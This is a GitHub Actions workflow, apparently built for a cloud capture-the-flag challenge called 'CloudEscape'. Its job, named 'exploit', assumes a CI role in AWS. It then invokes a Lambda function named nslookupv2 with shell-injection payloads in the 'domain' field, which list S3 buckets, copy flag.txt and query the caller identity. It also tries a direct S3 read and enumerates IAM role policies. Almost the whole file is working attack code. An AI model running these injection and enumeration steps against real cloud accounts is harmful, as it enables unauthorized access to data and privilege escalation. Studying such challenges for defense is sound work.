name: CloudEscape Stage 1 - Invoke
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      # ── 1. Get Lambda resource policy — who can invoke? ──
      - name: Get Lambda Policy
        run: |
          echo "===== Lambda Resource Policy ====="
          aws lambda get-policy --function-name nslookupv2 --region us-east-1 2>&1 || echo "No policy / access denied"

      # ── 2. Try invoking the Lambda with command injection ──
      - name: Invoke Lambda - Command Injection
        run: |
          echo "===== Attempt 1: List S3 buckets via injection ====="
          aws lambda invoke \
            --function-name nslookupv2 \
            --region us-east-1 \
            --payload '{"domain": "x; aws s3 ls"}' \
            /tmp/response1.json 2>&1 || echo "Invoke failed"

          echo "===== Response 1 ====="
          cat /tmp/response1.json 2>/dev/null || true

          echo ""
          echo "===== Attempt 2: Read flag.txt via injection ====="
          aws lambda invoke \
            --function-name nslookupv2 \
            --region us-east-1 \
            --payload '{"domain": "x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}' \
            /tmp/response2.json 2>&1 || echo "Invoke failed"

          echo "===== Response 2 ====="
          cat /tmp/response2.json 2>/dev/null || true

          echo ""
          echo "===== Attempt 3: Get caller identity via injection ====="
          aws lambda invoke \
            --function-name nslookupv2 \
            --region us-east-1 \
            --payload '{"domain": "x; aws sts get-caller-identity"}' \
            /tmp/response3.json 2>&1 || echo "Invoke failed"

          echo "===== Response 3 ====="
          cat /tmp/response3.json 2>/dev/null || true

      # ── 3. Also try direct S3 get (maybe cicdRole has it somewhere) ──
      - name: Try Direct S3 Access
        run: |
          echo "===== Direct S3 GetObject on flag.txt ====="
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag_direct.txt --region us-east-1 2>&1 || echo "Direct access denied"
          cat /tmp/flag_direct.txt 2>/dev/null || true

      # ── 4. Check what IAM permissions we actually have ──
      - name: Check IAM roles and policies
        run: |
          echo "===== Get role info ====="
          aws iam get-role --role-name cicdRole --region us-east-1 2>&1 || true
          echo "===== List attached policies ====="
          aws iam list-attached-role-policies --role-name cicdRole --region us-east-1 2>&1 || true
          echo "===== List inline policies ====="
          aws iam list-role-policies --role-name cicdRole --region us-east-1 2>&1 || true
          echo "===== Get role policy documents ====="
          for policy in $(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[].PolicyName' --output text 2>/dev/null); do
            echo "--- Policy: $policy ---"
            aws iam get-policy --policy-arn $(aws iam list-attached-role-policies --role-name cicdRole --query "AttachedPolicies[?PolicyName=='$policy'].PolicyArn" --output text 2>/dev/null) 2>&1 || true
          done
          echo "===== lambdaRole info ====="
          aws iam get-role --role-name lambdaRole --region us-east-1 2>&1 || true